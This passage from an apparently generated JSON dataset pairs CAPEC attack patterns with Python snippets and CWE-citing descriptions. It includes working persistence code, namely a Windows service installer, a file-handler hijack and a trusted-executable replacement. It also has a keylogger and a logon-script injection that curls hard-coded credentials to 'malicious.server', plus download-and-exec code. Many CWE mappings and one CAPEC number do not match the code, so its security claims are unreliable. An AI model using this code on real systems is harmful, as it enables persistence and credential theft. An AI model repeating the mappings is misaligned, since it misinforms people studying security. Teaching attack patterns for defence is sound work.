        "code_snippet": "import os\nimport winreg\n\n# CWE-284: Improper Access Control\n# CWE-1188: Initialization of a Resource with an Insecure Default\n# CWE-1392: Use of Default Credentials\n# CWE-520: .NET Misconfiguration: Use of Impersonation\n\n# Function to add a new service to Windows registry\n# This service will run at startup with elevated privileges\n# The service name is disguised as a legitimate system service\n\ndef add_service(service_name, service_path):\n    try:\n        # Open the registry key where services are registered\n        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r'SYSTEM\\CurrentControlSet\\Services', 0, winreg.KEY_SET_VALUE)\n        \n        # Create a new service key\n        service_key = winreg.CreateKey(key, service_name)\n        \n        # Set the service executable path\n        winreg.SetValueEx(service_key, 'ImagePath', 0, winreg.REG_SZ, service_path)\n        \n        # Set the service to start automatically\n        winreg.SetValueEx(service_key, 'Start', 0, winreg.REG_DWORD, 2)\n        \n        # Set the service type to own process\n        winreg.SetValueEx(service_key, 'Type', 0, winreg.REG_DWORD, 0x10)\n        \n        # Close the registry key\n        winreg.CloseKey(service_key)\n        winreg.CloseKey(key)\n        print(f'Service {service_name} added successfully.')\n    except Exception as e:\n        print(f'Failed to add service: {e}')\n\n# Example usage\n# This would typically be a path to a malicious executable\nadd_service('FakeSystemService', 'C:\\path\\to\\malicious.exe')",
        "description": "This Python code snippet demonstrates how an adversary might add a new service to the Windows registry, which will be executed at startup with elevated privileges. The service name is disguised to appear as a legitimate system service. The code leverages the winreg module to interact with the Windows registry, creating a new service entry with the specified executable path. This embodies the CAPEC 'Install New Service' by showing how a new service can be registered to run at startup, potentially with elevated privileges. The related CWEs provide context on the types of weaknesses that can be exploited, such as improper access control (CWE-284), insecure defaults (CWE-1188), and the use of default credentials (CWE-1392)."
    },
    {
        "capec_id": "551",
        "capec_name": "Modify Existing Service",
        "code_snippet": "import os\nimport subprocess\n\ndef modify_service(service_name, new_exec_path):\n    # CWE-284: Improper Access Control\n    if not os.geteuid() == 0:\n        raise PermissionError(\"This script requires root privileges.\")\n\n    # CWE-522: Insufficiently Protected Credentials\n    # Storing credentials in plain text (for demonstration purposes)\n    credentials = \"root:password\"\n\n    # CWE-15: External Control of System or Configuration Setting\n    # CWE-908: Use of Uninitialized Resource\n    service_config_path = f\"/etc/systemd/system/{service_name}.service\"\n    if not os.path.exists(service_config_path):\n        raise FileNotFoundError(f\"Service configuration for {service_name} not found.\")\n\n    with open(service_config_path, 'r') as file:\n        config = file.read()\n\n    # CWE-1193: Power-On of Untrusted Execution Core Before Enabling Fabric Access Control\n    # Modifying the service to point to a new executable path\n    new_config = config.replace(\"ExecStart=/usr/bin/old_service\", f\"ExecStart={new_exec_path}\")\n\n    with open(service_config_path, 'w') as file:\n        file.write(new_config)\n\n    # Restart the service to apply changes\n    subprocess.run([\"systemctl\", \"daemon-reload\"])\n    subprocess.run([\"systemctl\", \"restart\", service_name])\n\n# Example usage\nmodify_service(\"example_service\", \"/usr/bin/new_service\")",
        "description": "This Python code snippet demonstrates the concept of modifying an existing service configuration, which is the main idea of the CAPEC 'Modify Existing Service'. The code includes several CWE-related vulnerabilities for context:\n\n1. CWE-284: Improper Access Control - The script checks for root privileges but does not enforce secure access control mechanisms.\n2. CWE-522: Insufficiently Protected Credentials - Credentials are stored in plain text, which is insecure.\n3. CWE-15: External Control of System or Configuration Setting - The script allows external modification of system configuration settings.\n4. CWE-908: Use of Uninitialized Resource - The script assumes the service configuration file exists and reads it without proper initialization checks.\n5. CWE-1193: Power-On of Untrusted Execution Core Before Enabling Fabric Access Control - The script modifies the service to point to a potentially untrusted executable path.\n\nThe code reads the configuration of an existing service, modifies the executable path, and restarts the service to apply the changes. This demonstrates how modifying services can introduce vulnerabilities and potentially disrupt system operations."
    },
    {
        "capec_id": "552",
        "capec_name": "Install Rootkit ",
        "code_snippet": "import os\nimport ctypes\n\n# CWE-284: Improper Access Control\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n# CWE-78: OS Command Injection\n# CWE-506: Embedded Malicious Code\n# CWE-507: Trojan Horse\n\ndef install_rootkit():\n    # Simulate improper access control by running as an unauthorized user\n    if os.geteuid() != 0:\n        print(\"This script must be run as root!\")\n        return\n\n    # Simulate exposure of sensitive system information\n    sensitive_info = os.popen('uname -a').read()\n    print(f\"Sensitive System Info: {sensitive_info}\")\n\n    # Simulate OS command injection vulnerability\n    malicious_command = \"echo 'rootkit installed' > /tmp/rootkit.log\"\n    os.system(malicious_command)\n\n    # Simulate embedded malicious code\n    def hidden_function():\n        print(\"Malicious code executed\")\n\n    # Simulate Trojan Horse by hiding malicious functionality\n    def trojan_horse():\n        print(\"Performing legitimate operation...\")\n        hidden_function()\n\n    # Install the rootkit (simulated)\n    print(\"Installing rootkit...\")\n    trojan_horse()\n\n# Execute the function\ninstall_rootkit()",
        "description": "This Python code snippet simulates the installation of a rootkit by exploiting several common weaknesses. It starts by checking if the script is run with root privileges (CWE-284: Improper Access Control). It then exposes sensitive system information (CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere) by executing a system command to retrieve system details. The code also demonstrates an OS command injection vulnerability (CWE-78: OS Command Injection) by constructing and executing a command that writes to a file. Additionally, it includes embedded malicious code (CWE-506: Embedded Malicious Code) within a hidden function and simulates a Trojan Horse (CWE-507: Trojan Horse) by calling this hidden function within a seemingly legitimate operation. The overall functionality represents the main idea of installing a rootkit, which is to alter system functionality and hide malicious activities."
    },
    {
        "capec_id": "554",
        "capec_name": "Functionality Bypass",
        "code_snippet": "import os\n\n# Simulated server-side function\ndef check_admin_access(user_role):\n    if user_role == 'admin':\n        return True\n    return False\n\n# Client-side enforcement of server-side security\nuser_role = input('Enter your role: ')\n\n# Bypassing server-side check by modifying client-side code\nif user_role == 'user':\n    user_role = 'admin'  # Vulnerability: Client-side enforcement allows role escalation\n\nif check_admin_access(user_role):\n    print('Access granted to admin functionality.')\nelse:\n    print('Access denied.')",
        "description": "This Python code snippet demonstrates a vulnerability where client-side enforcement of server-side security can be bypassed. The `check_admin_access` function is intended to restrict access to admin functionality based on the user's role. However, the role check is performed on the client side, allowing an attacker to modify the client-side code and escalate their privileges from 'user' to 'admin'. This embodies the main idea of the CAPEC 'Functionality Bypass' and highlights CWE-602 'Client-Side Enforcement of Server-Side Security'."
    },
    {
        "capec_id": "555",
        "capec_name": "Remote Services with Stolen Credentials",
        "code_snippet": "import paramiko\n\n# CWE-522: Insufficiently Protected Credentials\nusername = 'admin'\npassword = 'password123'  # CWE-521: Weak Password Requirements\n\n# CWE-308: Use of Single-factor Authentication\nclient = paramiko.SSHClient()\nclient.set_missing_host_key_policy(paramiko.AutoAddPolicy())\n\ntry:\n    # CWE-309: Use of Password System for Primary Authentication\n    client.connect('192.168.1.100', username=username, password=password)\n    stdin, stdout, stderr = client.exec_command('ls')\n    print(stdout.read().decode())\nfinally:\n    client.close()",
        "description": "This Python code snippet demonstrates a vulnerable SSH connection using the Paramiko library. The code uses a hardcoded username and password (CWE-522, CWE-521), which are weak and easily guessable. It employs single-factor authentication (CWE-308) and relies solely on a password for primary authentication (CWE-309). This setup is susceptible to attacks where an adversary with stolen credentials can gain unauthorized access to the remote system, embodying the main idea of the CAPEC 'Remote Services with Stolen Credentials'."
    },
    {
        "capec_id": "556",
        "capec_name": "Replace File Extension Handlers",
        "code_snippet": "import os\nimport winreg\n\n# Function to replace file extension handler\n# CWE-284: Improper Access Control\n# CWE-73: External Control of File Name or Path\n# CWE-646: Reliance on File Name or Extension of Externally-Supplied File\n# CWE-64: Windows Shortcut Following (.LNK)\ndef replace_file_handler(extension, new_handler_path):\n    try:\n        # Open the registry key for file extensions\n        reg_key = winreg.OpenKey(winreg.HKEY_CLASSES_ROOT, extension, 0, winreg.KEY_SET_VALUE)\n        # Set the new handler for the file extension\n        winreg.SetValue(reg_key, '', winreg.REG_SZ, new_handler_path)\n        winreg.CloseKey(reg_key)\n        print(f\"Handler for {extension} set to {new_handler_path}\")\n    except Exception as e:\n        print(f\"Failed to set handler for {extension}: {e}\")\n\n# Example usage\nreplace_file_handler('.txt', 'C:\\\\malicious_program.exe')",
        "description": "This Python code snippet demonstrates how to replace the file handler for a specific file extension in the Windows registry. The function `replace_file_handler` takes two arguments: the file extension and the new handler path. It opens the registry key for the given file extension and sets the new handler path. This embodies the CAPEC 'Replace File Extension Handlers' by showing how an application can modify the file handler for a given file extension to call an arbitrary program when a file with the given extension is opened. The code also touches on related CWEs: improper access control (CWE-284), external control of file name or path (CWE-73), reliance on file name or extension (CWE-646), and Windows shortcut following (CWE-64)."
    },
    {
        "capec_id": "557",
        "capec_name": "DEPRECATED: Schedule Software To Run",
        "code_snippet": "import os\nimport time\n\n# Using an obsolete function to schedule a task\n# This is vulnerable as it uses deprecated methods and lacks proper synchronization\n# CWE-477: Use of Obsolete Function\n# CWE-362: Race Condition\n# CWE-662: Improper Synchronization\n\ndef schedule_task():\n    # Obsolete function to schedule a task\n    os.system('echo \"python3 /path/to/task.py\" | at now + 1 minute')\n\n# Simulate a race condition by running the task multiple times\nfor _ in range(5):\n    schedule_task()\n    time.sleep(0.1)\n",
        "description": "This Python code snippet demonstrates the deprecated CAPEC concept of scheduling software to run, using related CWEs for context. The code uses the obsolete 'os.system' function to schedule a task with the 'at' command, which is an example of CWE-477 (Use of Obsolete Function). Additionally, the loop simulates a race condition (CWE-362) and improper synchronization (CWE-662) by scheduling the task multiple times with minimal delay, potentially causing state synchronization errors."
    },
    {
        "capec_id": "558",
        "capec_name": "Replace Trusted Executable",
        "code_snippet": "import os\nimport shutil\n\n# CWE-284: Improper Access Control\n# This function does not properly check permissions before replacing the executable\n\ndef replace_trusted_executable(trusted_path, malicious_path):\n    try:\n        # CWE-114: Process Control - Replacing a trusted executable with a malicious one\n        if os.path.exists(trusted_path):\n            shutil.copy(malicious_path, trusted_path)\n            print(f\"Replaced {trusted_path} with {malicious_path}\")\n        else:\n            print(f\"Trusted executable {trusted_path} does not exist.\")\n    except Exception as e:\n        print(f\"Error: {e}\")\n\n# Example usage\ntrusted_executable = '/usr/bin/trusted_app'\nmalicious_executable = '/tmp/malicious_app'\nreplace_trusted_executable(trusted_executable, malicious_executable)",
        "description": "This Python code snippet demonstrates a vulnerability where an attacker can replace a trusted executable with a malicious one. The function `replace_trusted_executable` takes the path of a trusted executable and a malicious executable as arguments. It then replaces the trusted executable with the malicious one without proper access control checks (CWE-284). This represents the main idea of the CAPEC 'Replace Trusted Executable'. The code also touches on CWE-114 by showing how an attacker can control the process to execute malicious commands. The lack of proper permission checks and validation makes this code vulnerable to exploitation."
    },
    {
        "capec_id": "559",
        "capec_name": "Orbital Jamming",
        "code_snippet": "import socket\n\n# CWE-940: Improper Verification of Source of a Communication Channel\n# CWE-923: Improper Restriction of Communication Channel to Intended Endpoints\n# CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n\ndef send_disruptive_signal(target_ip, target_port, disruptive_message):\n    try:\n        # Create a socket connection to the target satellite uplink station\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.connect((target_ip, target_port))\n\n        # Send a disruptive message to the target\n        sock.sendall(disruptive_message.encode('utf-8'))\n\n        # CWE-924: No integrity check on the message\n        print(\"Disruptive message sent.\")\n    except Exception as e:\n        print(f\"An error occurred: {e}\")\n    finally:\n        sock.close()\n\n# Example usage\nsend_disruptive_signal('192.168.1.100', 8080, 'DISRUPTIVE_SIGNAL')",
        "description": "This Python code snippet demonstrates a simplified version of an orbital jamming attack. The function `send_disruptive_signal` establishes a socket connection to a target satellite uplink station and sends a disruptive message. The code embodies several CWEs: CWE-940 (Improper Verification of Source of a Communication Channel) as it does not verify the source of the communication, CWE-923 (Improper Restriction of Communication Channel to Intended Endpoints) as it does not ensure the communication is with the correct endpoint, and CWE-924 (Improper Enforcement of Message Integrity During Transmission in a Communication Channel) as it does not check the integrity of the message being sent. This represents the main idea of the CAPEC by showing how an adversary could send disruptive signals to interfere with satellite communications."
    },
    {
        "capec_id": "560",
        "capec_name": "Use of Known Domain Credentials",
        "code_snippet": "import hashlib\nimport time\n\n# Simulate a database of user credentials\nuser_db = {\n    'user1': hashlib.sha256('password123'.encode()).hexdigest(),\n    'user2': hashlib.sha256('mypassword'.encode()).hexdigest()\n}\n\n# Function to authenticate user\nfailed_attempts = {}\n\ndef authenticate(username, password):\n    global failed_attempts\n    current_time = time.time()\n    if username in failed_attempts and failed_attempts[username]['count'] >= 5:\n        if current_time - failed_attempts[username]['time'] < 300:  # 5 minutes lockout\n            print('Account locked. Try again later.')\n            return False\n        else:\n            failed_attempts[username]['count'] = 0\n    \n    hashed_password = hashlib.sha256(password.encode()).hexdigest()\n    if username in user_db and user_db[username] == hashed_password:\n        print('Authentication successful')\n        return True\n    else:\n        if username not in failed_attempts:\n            failed_attempts[username] = {'count': 0, 'time': current_time}\n        failed_attempts[username]['count'] += 1\n        failed_attempts[username]['time'] = current_time\n        print('Authentication failed')\n        return False\n\n# Example usage\nauthenticate('user1', 'wrongpassword')\nauthenticate('user1', 'wrongpassword')\nauthenticate('user1', 'wrongpassword')\nauthenticate('user1', 'wrongpassword')\nauthenticate('user1', 'wrongpassword')\nauthenticate('user1', 'password123')",
        "description": "This Python code snippet demonstrates a simple authentication system that embodies the main idea of CAPEC-Use of Known Domain Credentials. It includes a user database with hashed passwords and an authentication function. The function checks the provided credentials against the stored ones and implements a basic lockout mechanism after five failed attempts within a short time frame (5 minutes). This addresses CWE-307 (Improper Restriction of Excessive Authentication Attempts). The code also uses single-factor authentication (CWE-308) and relies on password-based authentication (CWE-309), which are common weaknesses that can be exploited if an adversary obtains or guesses the credentials."
    },
    {
        "capec_id": "561",
        "capec_name": "Windows Admin Shares with Stolen Credentials",
        "code_snippet": "import os\nimport getpass\n\n# CWE-522: Insufficiently Protected Credentials\n# Storing credentials in plain text (insecure method)\nadmin_username = 'admin'\nadmin_password = 'password123'  # Weak password (CWE-521)\n\n# CWE-308: Use of Single-factor Authentication\n# Function to authenticate user with single-factor (password only)\ndef authenticate(username, password):\n    if username == admin_username and password == admin_password:\n        return True\n    return False\n\n# CWE-294: Authentication Bypass by Capture-replay\n# Simulating a capture-replay attack by reusing credentials\ncaptured_username = 'admin'\ncaptured_password = 'password123'\n\n# Attempt to authenticate with captured credentials\nif authenticate(captured_username, captured_password):\n    print('Access granted to Windows Admin Shares')\nelse:\n    print('Access denied')\n",
        "description": "This Python code snippet demonstrates a vulnerable authentication mechanism that embodies the main idea of the CAPEC 'Windows Admin Shares with Stolen Credentials'. The code includes several related CWEs: \n\n1. CWE-522: Insufficiently Protected Credentials - The credentials are stored in plain text, making them susceptible to unauthorized retrieval.\n2. CWE-521: Weak Password Requirements - The password used is weak and easily guessable.\n3. CWE-308: Use of Single-factor Authentication - The authentication mechanism relies solely on a password, which is less secure than multi-factor authentication.\n4. CWE-294: Authentication Bypass by Capture-replay - The code simulates a capture-replay attack by reusing captured credentials to gain access.\n\nThe code defines an insecure method of storing and authenticating credentials, demonstrating how an attacker could exploit these weaknesses to gain unauthorized access to Windows Admin Shares."
    },
    {
        "capec_id": "562",
        "capec_name": "Modify Shared File",
        "code_snippet": "import os\nimport tempfile\n\n# CWE-378: Creation of Temporary File With Insecure Permissions\ntemp_file = tempfile.NamedTemporaryFile(delete=False)\n\n# CWE-434: Unrestricted Upload of File with Dangerous Type\nwith open(temp_file.name, 'w') as f:\n    f.write(\"<script>alert('This is a malicious script!');</script>\")\n\n# CWE-284: Improper Access Control\nos.chmod(temp_file.name, 0o777)  # Insecure permissions\n\n# CWE-494: Download of Code Without Integrity Check\nimport urllib.request\nurl = 'http://example.com/malicious_code.py'\nresponse = urllib.request.urlopen(url)\ncode = response.read().decode('utf-8')\nexec(code)  # Executing downloaded code without integrity check\n\n# CWE-433: Unparsed Raw Web Content Delivery\nwith open('/var/www/html/malicious.html', 'w') as f:\n    f.write(\"<html><body><h1>Malicious Content</h1></body></html>\")",
        "description": "This Python code snippet demonstrates several security vulnerabilities related to the CAPEC 'Modify Shared File'. It creates a temporary file with insecure permissions (CWE-378), writes a malicious script to it (CWE-434), sets improper access control by making the file world-writable (CWE-284), downloads and executes code without verifying its integrity (CWE-494), and stores raw web content in a web-accessible directory (CWE-433). This code represents how an adversary might manipulate shared files to execute malicious content when accessed by users."
    },
    {
        "capec_id": "563",
        "capec_name": "Add Malicious File to Shared Webroot",
        "code_snippet": "import os\nfrom flask import Flask, request, send_from_directory\n\napp = Flask(__name__)\nUPLOAD_FOLDER = '/var/www/uploads'\napp.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER\n\n@app.route('/upload', methods=['POST'])\ndef upload_file():\n    if 'file' not in request.files:\n        return 'No file part', 400\n    file = request.files['file']\n    if file.filename == '':\n        return 'No selected file', 400\n    file.save(os.path.join(app.config['UPLOAD_FOLDER'], file.filename))\n    return 'File uploaded successfully', 200\n\n@app.route('/uploads/<filename>')\ndef uploaded_file(filename):\n    return send_from_directory(app.config['UPLOAD_FOLDER'], filename)\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet uses the Flask web framework to create a simple web application that allows users to upload files to a directory under the web root and then access those files via a URL. The '/upload' endpoint handles file uploads, saving them to the '/var/www/uploads' directory. The '/uploads/<filename>' endpoint serves the uploaded files. This code embodies the main idea of the CAPEC 'Add Malicious File to Shared Webroot' by demonstrating how an adversary could upload a malicious file to a web server and then access it, potentially causing the server to execute the malicious content. The code also highlights several related CWEs: improper access control (CWE-284), storage of files with sensitive data under the web root (CWE-219), and reliance on file name or extension (CWE-646)."
    },
    {
        "capec_id": "564",
        "capec_name": "Run Software at Logon",
        "code_snippet": "import os\n\n# CWE-798: Use of Hard-coded Credentials\nADMIN_CREDENTIALS = {'username': 'admin', 'password': 'admin123'}\n\n# CWE-284: Improper Access Control\nlogon_script_path = '/etc/profile.d/logon_script.sh'\n\n# Check if the logon script is accessible\nif os.path.exists(logon_script_path):\n    with open(logon_script_path, 'a') as logon_script:\n        # CWE-259: Use of Hard-coded Password\n        logon_script.write('\\n# Malicious code to run at logon\\n')\n        logon_script.write('echo \"Malicious code executed\"\\n')\n        logon_script.write('curl -u {username}:{password} http://malicious.server/persist\\n'.format(\n            username=ADMIN_CREDENTIALS['username'],\n            password=ADMIN_CREDENTIALS['password']\n        ))\n        print('Malicious code added to logon script.')\nelse:\n    print('Logon script not found.')",
        "description": "This Python code snippet demonstrates a vulnerability where an attacker can modify a logon script to maintain persistence on a system. The script checks if a logon script exists at a specified path and appends malicious code to it. The malicious code includes a hard-coded password (CWE-259) and credentials (CWE-798) to send a request to a remote server, simulating an attack. This represents the CAPEC 'Run Software at Logon' by showing how an attacker can exploit improper access control (CWE-284) to modify logon scripts and execute malicious code whenever a user logs on."
    },
    {
        "capec_id": "565",
        "capec_name": "Password Spraying",
        "code_snippet": "import time\n\n# List of common passwords to try\ncommon_passwords = ['password123', '123456', 'qwerty', 'letmein', 'welcome']\n\n# List of user accounts\nuser_accounts = ['user1', 'user2', 'user3', 'user4', 'user5']\n\n# Simulated function to check password (always returns False for demonstration)\ndef check_password(username, password):\n    # In a real scenario, this would check the password against a database\n    return False\n\n# Password spraying attack simulation\nfor password in common_passwords:\n    for user in user_accounts:\n        if check_password(user, password):\n            print(f\"Password for {user} is {password}\")\n        time.sleep(1)  # Sleep to avoid rapid lockouts\n    time.sleep(60)  # Wait before trying the next password to avoid detection",
        "description": "This Python code snippet simulates a Password Spraying attack. It iterates over a small list of common passwords and attempts to authenticate each user account with each password. The `check_password` function is a placeholder for actual password verification logic. The code includes delays (`time.sleep`) to avoid rapid or frequent account lockouts, mimicking the behavior of an adversary trying to remain undetected. This example highlights vulnerabilities such as weak password requirements (CWE-521), improper restriction of excessive authentication attempts (CWE-307), and reliance on single-factor authentication (CWE-308)."
    },
    {
        "capec_id": "566",
        "capec_name": "DEPRECATED: Dump Password Hashes",
        "code_snippet": "import hashlib\n\n# Vulnerable code: Using a one-way hash without a salt\npassword = 'user_password'\nhash_object = hashlib.sha256(password.encode())\npassword_hash = hash_object.hexdigest()\nprint(f'Password Hash: {password_hash}')\n\n# Vulnerable code: Using a one-way hash with a predictable salt\nsalt = '1234'  # Predictable salt\nhash_object_with_salt = hashlib.sha256((salt + password).encode())\npassword_hash_with_salt = hash_object_with_salt.hexdigest()\nprint(f'Password Hash with Predictable Salt: {password_hash_with_salt}')",
        "description": "This Python code snippet demonstrates two common vulnerabilities related to password hashing. The first part of the code shows the use of a one-way hash (SHA-256) without a salt, which is vulnerable to precomputed hash attacks (rainbow tables). The second part of the code uses a predictable salt ('1234'), which does not provide sufficient protection against such attacks. These examples align with CWE-759 (Use of a One-Way Hash without a Salt) and CWE-760 (Use of a One-Way Hash with a Predictable Salt), highlighting the importance of using a unique and unpredictable salt for each password to enhance security."
    },
    {
        "capec_id": "567",
        "capec_name": "DEPRECATED: Obtain Data via Utilities",
        "code_snippet": "import os\nimport hashlib\n\n# Using an obsolete function to obtain data\npassword = os.popen('cat /etc/passwd').read()\n\n# Storing data without encryption\nstored_password = password\n\n# Using MD5, which is considered obsolete and insecure\nhashed_password = hashlib.md5(stored_password.encode()).hexdigest()\n\nprint(f'Hashed Password: {hashed_password}')",
        "description": "This Python code snippet demonstrates several deprecated and insecure practices. It uses the `os.popen` function to obtain data from the system's password file, which is an obsolete and insecure method (CWE-477). The obtained data is then stored without any encryption, failing to protect the stored data from modification or unauthorized access (CWE-217, CWE-218). Finally, the code uses the MD5 hashing algorithm, which is considered obsolete and insecure for cryptographic purposes (CWE-477). This snippet embodies the main idea of the deprecated CAPEC 'Obtain Data via Utilities' by showcasing insecure methods of obtaining, storing, and processing sensitive data."
    },
    {
        "capec_id": "568",
        "capec_name": "Capture Credentials via Keylogger",
        "code_snippet": "import pynput.keyboard\nimport os\nimport threading\n\nlog_file = 'keylog.txt'\n\n# Function to log keystrokes\ndef on_press(key):\n    with open(log_file, 'a') as f:\n        try:\n            f.write(key.char)\n        except AttributeError:\n            f.write(' ' + str(key) + ' ')\n\n# Function to start the keylogger\ndef start_keylogger():\n    listener = pynput.keyboard.Listener(on_press=on_press)\n    listener.start()\n    listener.join()\n\n# Function to simulate weak password storage\ndef store_password(password):\n    with open('passwords.txt', 'a') as f:\n        f.write(password + '\\n')\n\n# Simulate storing a hard-coded password\nstore_password('hardcoded_password123')\n\n# Start the keylogger in a separate thread\nkeylogger_thread = threading.Thread(target=start_keylogger)\nkeylogger_thread.start()",
        "description": "This Python code snippet demonstrates a keylogger that captures keystrokes and stores them in a file named 'keylog.txt'. The keylogger is started in a separate thread to continuously log keystrokes. Additionally, the code simulates weak password storage by writing a hard-coded password to a file named 'passwords.txt'. This snippet embodies the main idea of CAPEC-564 (Capture Credentials via Keylogger) by showing how an adversary might capture user credentials through keystroke logging. It also highlights related CWEs such as CWE-798 (Use of Hard-coded Credentials) and CWE-522 (Insufficiently Protected Credentials) by storing a hard-coded password insecurely."
    },
    {
        "capec_id": "569",
        "capec_name": "Collect Data as Provided by Users",
        "code_snippet": "import os\nimport getpass\n\n# CWE-214: Invocation of Process Using Visible Sensitive Information\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# This code captures user credentials and writes them to a file with improper permissions\n\ndef capture_credentials():\n    username = input('Enter your username: ')\n    password = getpass.getpass('Enter your password: ')\n    \n    # CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n    # CWE-69: Improper Handling of Windows ::DATA Alternate Data Stream\n    # Writing sensitive information to a file with improper permissions\n    with open('credentials.txt', 'w') as f:\n        f.write(f'Username: {username}\\n')\n        f.write(f'Password: {password}\\n')\n\n    # CWE-520: .NET Misconfiguration: Use of Impersonation\n    # Simulating elevated access by changing file permissions\n    os.chmod('credentials.txt', 0o777)  # Improperly setting file permissions\n\nif __name__ == '__main__':\n    capture_credentials()",
        "description": "This Python code snippet demonstrates a scenario where user credentials are captured and stored insecurely, embodying the main idea of CAPEC-Collect Data as Provided by Users. The code prompts the user to enter their username and password, which are then written to a file with improper permissions (CWE-214, CWE-200). The file is created with overly permissive access rights (CWE-497, CWE-69), making it accessible to unauthorized actors. Additionally, the code simulates elevated access by changing file permissions (CWE-520), which can lead to various security issues. This example highlights the risks of capturing and storing sensitive information without proper security measures."
    },
    {
        "capec_id": "570",
        "capec_name": "DEPRECATED: Signature-Based Avoidance",
        "code_snippet": "import os\n\n# CWE-477: Use of Obsolete Function\n# Using the deprecated 'os.popen' function instead of 'subprocess.Popen'\ncommand = 'ls -l'\nprocess = os.popen(command)\noutput = process.read()\nprocess.close()\nprint(output)\n\n# CWE-391: Unchecked Error Condition\n# Not checking for errors after executing the command\n# This can lead to unexpected behavior if the command fails\n",
        "description": "This Python code snippet demonstrates the use of deprecated functions and unchecked error conditions, embodying the main idea of the deprecated CAPEC 'Signature-Based Avoidance'. The code uses the obsolete 'os.popen' function (CWE-477) to execute a shell command, which is not recommended as it has been replaced by 'subprocess.Popen'. Additionally, the code does not check for any errors after executing the command (CWE-391), which can lead to unexpected behavior if the command fails. This lack of error handling can be exploited by an attacker to induce unexpected behavior unnoticed."
    },
    {
        "capec_id": "571",
        "capec_name": "Block Logging to Central Repository",
        "code_snippet": "import logging\nimport os\n\n# CWE-778: Insufficient Logging\nlogging.basicConfig(filename='app.log', level=logging.ERROR)\n\n# CWE-532: Insertion of Sensitive Information into Log File\ndef log_sensitive_info(info):\n    logging.error(f'Sensitive Info: {info}')\n\n# CWE-527: Exposure of Version-Control Repository to an Unauthorized Control Sphere\ndef expose_repo():\n    os.system('cp -r .git /tmp/exposed_repo')\n\n# CAPEC: Block Logging to Central Repository\n# CWE-294: Authentication Bypass by Capture-replay\ndef block_logging_to_central_repo():\n    # Simulate blocking logs to central repository by redirecting logs to a local file\n    logging.error('Blocking logs to central repository')\n\n# Example usage\nlog_sensitive_info('User password: 12345')\nexpose_repo()\nblock_logging_to_central_repo()",
        "description": "This Python code snippet demonstrates several security weaknesses and a potential attack scenario. The logging configuration (CWE-778) is set to only log errors, which may omit important security events. The `log_sensitive_info` function (CWE-532) logs sensitive information, which could be exploited if accessed by an attacker. The `expose_repo` function (CWE-527) copies a version-control repository to a potentially insecure location. The `block_logging_to_central_repo` function simulates blocking logs from being sent to a central repository, embodying the main idea of the CAPEC by attempting to hide indicators of compromise. Additionally, the code hints at a potential capture-replay attack (CWE-294) by not securing the logging mechanism."
    },
    {
        "capec_id": "572",
        "capec_name": "Artificially Inflate File Sizes",
        "code_snippet": "import os\n\n# Function to artificially inflate file size\ndef inflate_file_size(file_path, inflate_size):\n    try:\n        with open(file_path, 'ab') as f:\n            f.write(b'\\0' * inflate_size)\n        print(f\"File {file_path} inflated by {inflate_size} bytes.\")\n    except Exception as e:\n        print(f\"Error inflating file: {e}\")\n\n# Example usage\nfile_path = 'example.txt'\n# Create a file if it doesn't exist\nif not os.path.exists(file_path):\n    with open(file_path, 'w') as f:\n        f.write('Initial content')\n\n# Inflate the file size by 1MB\ninflate_file_size(file_path, 1024 * 1024)",
        "description": "This Python code snippet demonstrates how an adversary might artificially inflate the size of a file by appending null bytes to it. The `inflate_file_size` function takes a file path and a size in bytes to inflate the file by. It opens the file in append-binary mode and writes the specified number of null bytes to it. This can lead to a Denial of Service condition on systems with limited storage capacity. The example usage creates a file named 'example.txt' if it doesn't exist and then inflates its size by 1MB. This code embodies the main idea of the CAPEC 'Artificially Inflate File Sizes' and touches on CWE-774 by not imposing any restrictions on file size, potentially leading to resource exhaustion."
    },
    {
        "capec_id": "573",
        "capec_name": "Process Footprinting",
        "code_snippet": "import os\n\n# Function to get the list of running processes\n# This function exposes sensitive information about the system's processes\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\ndef get_running_processes():\n    processes = os.popen('ps aux').read()\n    return processes\n\n# Simulate an unauthorized actor accessing the process information\n# CWE-214: Invocation of Process Using Visible Sensitive Information\n# CWE-1229: Creation of Emergent Resource\n# CWE-1423: Exposure of Sensitive Information caused by Shared Microarchitectural Predictor State that Influences Transient Execution\nunauthorized_actor = True\nif unauthorized_actor:\n    sensitive_info = get_running_processes()\n    print(sensitive_info)  # Exposing sensitive information to unauthorized actor",
        "description": "This Python code snippet demonstrates a vulnerability related to 'Process Footprinting' (CAPEC). The function `get_running_processes` uses the `ps aux` command to retrieve a list of all running processes on the system. This information is sensitive and should not be exposed to unauthorized actors. However, the code simulates an unauthorized actor accessing and printing this sensitive information. This embodies several CWEs: CWE-200 and CWE-497 by exposing sensitive system information, CWE-214 by potentially exposing sensitive command-line arguments, CWE-1229 by creating an emergent resource (the list of processes), and CWE-1423 by potentially exposing data through shared microarchitectural predictor state."
    },
    {
        "capec_id": "574",
        "capec_name": "Services Footprinting",
        "code_snippet": "import os\n\n# Function to get the list of running services\n# This function exposes sensitive system information to unauthorized users\n# CWE-200, CWE-497\n\ndef get_running_services():\n    try:\n        # Using 'tasklist' to get the list of running services\n        services = os.popen('tasklist /svc').read()\n        return services\n    except Exception as e:\n        return str(e)\n\n# Function to display running services\n# This function can be invoked by unauthorized users, exposing sensitive information\n# CWE-214\n\ndef display_services():\n    services = get_running_services()\n    print(services)\n\n# Main function\nif __name__ == '__main__':\n    display_services()",
        "description": "This Python code snippet demonstrates a vulnerable implementation of a service footprinting tool. The `get_running_services` function uses the `tasklist /svc` command to retrieve a list of running services on the system. This information is then printed to the console by the `display_services` function. The code embodies the main idea of CAPEC-309 (Services Footprinting) by exposing sensitive system information (list of running services) to potentially unauthorized users. The related CWEs are represented as follows: CWE-200 and CWE-497 highlight the exposure of sensitive information, CWE-214 shows the invocation of a process with visible sensitive information, and CWE-1249 and CWE-1229 are implied by the potential misuse and mismanagement of system resources."
    },
    {
        "capec_id": "575",
